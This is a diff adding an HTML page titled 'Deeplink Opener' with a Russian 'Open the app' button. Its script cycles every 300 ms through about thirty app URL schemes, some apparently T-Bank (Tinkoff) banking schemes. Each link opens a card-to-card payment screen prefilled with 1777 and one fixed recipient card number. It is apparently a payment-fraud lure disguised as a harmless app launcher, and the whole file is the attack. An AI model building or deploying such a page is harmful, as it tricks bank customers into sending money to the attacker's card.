@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Deeplink Opener</title>
+</head>
+<body>
+    <button id="openButton">Открыть приложение</button>
+
+    <script>
+        const deeplinks = [
+            "yourmoney://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tinkoffbank://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tbank://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "wheels://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "clanstrix://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "catch://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "feedaways://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "toffice://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tguard://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "shuttersmart://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "petraise://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "mobtrs://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "goaloriented://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tmydocs://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tfinstudy://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tsplit://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tfinskills://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "bank100000000004://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "tassets://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "wwwtdata://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "smarthome://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "divevector://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "framedit://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "outpharmas://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "yellowt://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "invault://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "ressinside://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "youreporter://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "plantu://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "temperology://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483",
+            "logapp://Main/Pay/C2C?amount=1777&targetCardNumber=9860140325004483&numberCard=9860140325004483"
+        ];
+
+        document.getElementById('openButton').addEventListener('click', function() {
+            let currentIndex = 0;
+            
+            function tryNextDeeplink() {
+                if (currentIndex >= deeplinks.length) {
+                    console.log('Все deeplink\'и перебраны');
+                    return;
+                }
+                
+                const deeplink = deeplinks[currentIndex];
+                console.log('Попытка открыть: ' + deeplink);
+                
+                // Пытаемся открыть deeplink через window.location
+                window.location.href = deeplink;
+                
+                // Увеличиваем индекс и планируем следующую попытку
+                currentIndex++;
+                setTimeout(tryNextDeeplink, 300);
+            }
+            
+            tryNextDeeplink();
+        });
+    </script>
+</body>
+</html>
